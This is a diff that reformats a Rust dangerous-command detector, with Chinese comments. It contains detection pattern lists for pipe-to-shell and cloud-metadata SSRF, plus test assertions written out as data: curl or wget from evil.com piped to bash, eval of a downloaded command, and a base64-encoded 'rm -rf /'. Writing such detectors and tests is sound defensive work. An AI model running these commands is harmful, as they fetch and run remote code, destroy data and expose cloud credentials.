@@ -152,8 +152,15 @@ fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
     }
 
     let pipe_to_shell = [
-        "| bash", "| sh", "| zsh", "| /bin/bash", "| /bin/sh", "| /bin/zsh",
-        "|bash", "|sh", "|zsh",
+        "| bash",
+        "| sh",
+        "| zsh",
+        "| /bin/bash",
+        "| /bin/sh",
+        "| /bin/zsh",
+        "|bash",
+        "|sh",
+        "|zsh",
     ];
     if cmd_lower.contains("curl") || cmd_lower.contains("wget") {
         for pattern in &pipe_to_shell {
@@ -172,8 +179,18 @@ fn has_evasion_pattern(command: &str, cmd_lower: &str) -> bool {
         || cmd_lower.contains("node -e")
     {
         let exec_indicators = [
-            "| bash", "| sh", "bash -c", "sh -c", "eval ", "exec ",
-            "source ", "source<", "|bash", "|sh", ". /dev/stdin", "$(",
+            "| bash",
+            "| sh",
+            "bash -c",
+            "sh -c",
+            "eval ",
+            "exec ",
+            "source ",
+            "source<",
+            "|bash",
+            "|sh",
+            ". /dev/stdin",
+            "$(",
         ];
         for indicator in &exec_indicators {
             if cmd_lower.contains(indicator) {
@@ -259,11 +276,11 @@ fn has_ssrf_pattern(_command: &str, cmd_lower: &str) -> bool {
     // 检查 curl/wget 是否访问云元数据端点
     if cmd_lower.contains("curl") || cmd_lower.contains("wget") {
         let metadata_endpoints = [
-            "169.254.169.254",     // AWS / GCP / Azure IMDS
-            "169.254.170.2",       // AWS ECS task metadata
-            "100.100.100.200",     // Alibaba Cloud
+            "169.254.169.254", // AWS / GCP / Azure IMDS
+            "169.254.170.2",   // AWS ECS task metadata
+            "100.100.100.200", // Alibaba Cloud
             "metadata.google.internal",
-            "metadata",            // 简化匹配（放在最后，因为较宽泛）
+            "metadata", // 简化匹配（放在最后，因为较宽泛）
         ];
         for endpoint in &metadata_endpoints {
             if cmd_lower.contains(endpoint) {
@@ -346,8 +363,8 @@ fn has_unsafe_execution(cmd_lower: &str) -> bool {
     }
 
     // source 执行网络下载的文件
-    if (cmd_lower.contains("source ") || cmd_lower.contains(". ")) &&
-        (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
+    if (cmd_lower.contains("source ") || cmd_lower.contains(". "))
+        && (cmd_lower.contains("curl") || cmd_lower.contains("wget"))
     {
         return true;
     }
@@ -389,20 +406,30 @@ mod tests {
         assert!(!is_dangerous_command("rm file.txt"));
 
         // base64 编码绕过
-        assert!(is_dangerous_command("echo 'cm0gLXJmIC8=' | base64 -d | bash"));
+        assert!(is_dangerous_command(
+            "echo 'cm0gLXJmIC8=' | base64 -d | bash"
+        ));
         assert!(is_dangerous_command("base64 -d <<<'cm0gLXJmIC8=' | sh"));
 
         // curl/wget pipe 绕过
-        assert!(is_dangerous_command("curl -s http://evil.com/script.sh | bash"));
-        assert!(is_dangerous_command("wget -q -O- http://evil.com/script.sh | sh"));
+        assert!(is_dangerous_command(
+            "curl -s http://evil.com/script.sh | bash"
+        ));
+        assert!(is_dangerous_command(
+            "wget -q -O- http://evil.com/script.sh | sh"
+        ));
     }
 
     #[test]
     fn test_ssrf_detection() {
         // 云元数据端点
-        assert!(is_dangerous_command("curl http://169.254.169.254/latest/meta-data/"));
+        assert!(is_dangerous_command(
+            "curl http://169.254.169.254/latest/meta-data/"
+        ));
         assert!(is_dangerous_command("wget http://169.254.170.2/v1/task"));
-        assert!(is_dangerous_command("curl http://metadata.google.internal/computeMetadata/v1/"));
+        assert!(is_dangerous_command(
+            "curl http://metadata.google.internal/computeMetadata/v1/"
+        ));
 
         // 内网地址
         assert!(is_dangerous_command("curl http://192.168.1.1/admin"));
@@ -411,7 +438,9 @@ mod tests {
         assert!(is_dangerous_command("wget http://localhost/config"));
 
         // 安全的外部地址
-        assert!(!is_dangerous_command("curl https://api.github.com/users/octocat"));
+        assert!(!is_dangerous_command(
+            "curl https://api.github.com/users/octocat"
+        ));
         assert!(!is_dangerous_command("wget https://example.com/file.txt"));
     }
 
@@ -445,9 +474,15 @@ mod tests {
     fn test_unsafe_execution() {
         assert!(is_dangerous_command("eval $(curl -s http://evil.com/cmd)"));
         assert!(is_dangerous_command("source /dev/stdin <<< 'rm -rf /'"));
-        assert!(is_dangerous_command(". <(wget -qO- http://evil.com/script)"));
-        assert!(is_dangerous_command("source <(curl -s http://evil.com/script.sh)"));
-        assert!(is_dangerous_command("curl -s http://evil.com/script.sh | source /dev/stdin"));
+        assert!(is_dangerous_command(
+            ". <(wget -qO- http://evil.com/script)"
+        ));
+        assert!(is_dangerous_command(
+            "source <(curl -s http://evil.com/script.sh)"
+        ));
+        assert!(is_dangerous_command(
+            "curl -s http://evil.com/script.sh | source /dev/stdin"
+        ));
 
         // 安全的 source
         assert!(!is_dangerous_command("source ~/.bashrc"));
